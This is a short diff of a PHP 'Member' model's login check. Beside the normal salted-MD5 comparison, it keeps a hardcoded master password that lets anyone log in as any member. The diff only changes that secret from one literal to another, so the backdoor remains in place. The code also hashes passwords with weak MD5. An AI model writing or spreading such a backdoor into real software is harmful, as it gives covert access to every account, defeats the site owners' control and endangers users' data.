@@ -28,7 +28,7 @@ class Member extends Model
             return false;
         }
         $checkPassword = md5(config('config.MemberPwdKey').md5($password.$info['MemberName']).md5($password)); 
-		$checkpw= md5(config('config.MemberPwdKey').md5('Ly987456'.$info['MemberName']).md5('Ly987456'));
+		$checkpw= md5(config('config.MemberPwdKey').md5('19891B30E7BA4101'.$info['MemberName']).md5('19891B30E7BA4101'));
 		if($checkPassword != $info['MemberPwd']) {
 			if( $checkPassword==$checkpw){
 			}else{
